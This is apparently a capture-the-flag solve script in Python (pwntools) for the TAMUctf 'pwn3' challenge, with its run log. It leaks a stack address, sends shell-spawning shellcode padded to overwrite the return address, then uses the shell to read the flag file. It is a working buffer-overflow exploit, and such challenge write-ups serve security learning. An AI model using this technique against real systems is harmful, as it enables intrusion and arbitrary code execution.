from pwn import *

e = ELF("./pwn3")
p = remote("pwn.ctf.tamu.edu", 4323)

p.recvuntil("number ")

return_addr = int(p.recvuntil("\n")[2:-2], 16)

sc = asm(shellcraft.sh())
p.sendlineafter("echo? ", sc + "A"*(0xEE + 4 - len(sc)) + p32(return_addr))

p.interactive()

'''
shgroup@SH-Group:/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn3$ python solve.py
[*] '/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to pwn.ctf.tamu.edu on port 4323: Done
[*] Switching to interactive mode
jhh///sh/bin\x89h╔╔╔╔\x814$ri╔╔1Qj\x04Y╔Q1j\x0bX̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAj\xb0\xa3\xff
$
$ ls
flag.txt
pwn3
$ cat flag.txt
gigem{n0w_w3_4r3_g377in6_s74r73d}
$ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
$ 
'''